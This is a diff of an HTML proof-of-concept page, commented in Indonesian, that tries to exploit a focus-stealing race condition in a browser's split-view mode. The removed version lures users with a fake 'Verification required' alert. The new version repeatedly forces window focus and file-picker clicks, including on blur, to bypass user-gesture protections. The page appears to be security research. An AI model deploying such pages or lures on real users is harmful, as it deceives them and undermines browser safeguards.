@@ -1,49 +1,78 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-    <title>Split View - Alert Setelah Split View Terbuka</title>
+  <head>
+    <title>POC: Focus-Stealing & Race Condition</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }
-        a { display: inline-block; background-color: #1a73e8; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: 500; }
-        a:hover { background-color: #1557b0; }
-        img { max-width: 300px; margin-top: 20px; border-radius: 8px; display: none; }
-        p { margin-top: 20px; color: #5f6368; }
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        padding-top: 50px;
+      }
+      #link {
+        padding: 20px;
+        border: 2px dashed red;
+        cursor: pointer;
+        display: block;
+      }
+      .status {
+        margin-top: 20px;
+        color: blue;
+      }
+      input {
+        display: none;
+      }
     </style>
-</head>
-<body>
-    <a id="trigger" href="https://workspace.google.com/intl/en_in/products/drive/">Right Click → Open in Split View</a>
-    <input type="file" id="fileInput" style="display: none;">
-    <img id="preview">
-    <p>1. Klik kanan link → pilih "Open in Split View"<br>
-    2. Setelah split view terbuka, akan muncul alert<br>
-    3. Klik OK pada alert → file picker akan muncul</p>
+  </head>
+  <body>
+    <h1>Race Condition Test</h1>
+    <p>Buka dalam mode <b>Split Screen</b> (Contoh: Edge/Chrome di Android).</p>
+
+    <a id="link"
+      >1. Klik Kanan Sini (Split)<br />2. Cepat klik aplikasi sebelah!</a
+    >
+
+    <div id="status" class="status">Menunggu interaksi...</div>
+
+    <input id="fileSelect" type="file" />
 
     <script>
-        const fileInput = document.getElementById('fileInput');
-        const preview = document.getElementById('preview');
+      const link = document.getElementById("link");
+      const fileSelect = document.getElementById("fileSelect");
+      const status = document.getElementById("status");
 
-        fileInput.onchange = () => {
-            if (fileInput.files && fileInput.files[0]) {
-                preview.src = URL.createObjectURL(fileInput.files[0]);
-                preview.style.display = 'block';
-            }
-        };
+      link.addEventListener("contextmenu", function (event) {
+        status.innerText = "Trigger dimulai... Segera pindah fokus!";
 
-        document.getElementById('trigger').addEventListener('contextmenu', (e) => {
-            // Biarkan menu konteks browser muncul, user bisa pilih "Open in Split View"
-            // Kita tidak prevent default
+        // Skenario Race Condition:
+        // Mencoba memicu input berulang kali dalam jendela waktu yang sempit
+        // saat transisi fokus terjadi.
 
-            // Beri waktu untuk user mengklik menu split view dan split view terbuka
-            // Asumsikan 1 detik cukup
-            setTimeout(() => {
-                // Alert muncul SETELAH split view terbuka
-                alert("⚠️ Verification required. Click OK to continue and select a file.");
+        let attempts = 0;
+        const interval = setInterval(() => {
+          attempts++;
 
-                // Setelah OK, coba buka file picker
-                // Perhatikan: saat ini user gesture asli (klik kanan) sudah kadaluwarsa
-                fileInput.click();
-            }, 1000);
-        });
+          // Coba curi fokus kembali secara paksa sebelum klik
+          window.focus();
+
+          // Pemicuan file picker
+          fileSelect.click();
+
+          if (attempts > 10) {
+            clearInterval(interval);
+            status.innerText = "Siklus percobaan selesai.";
+          }
+        }, 500); // Interval 500ms untuk mencari celah saat tab menjadi 'inactive'
+      });
+
+      // Listener tambahan untuk mendeteksi kapan tab kehilangan fokus
+      window.addEventListener("blur", () => {
+        console.log("Tab menjadi Inactive (Blur detected)");
+        // Beberapa browser memiliki celah di mana event 'blur'
+        // masih mengizinkan satu aksi terakhir dari script yang berjalan.
+        setTimeout(() => {
+          fileSelect.click();
+        }, 50);
+      });
     </script>
-</body>
+  </body>
 </html>
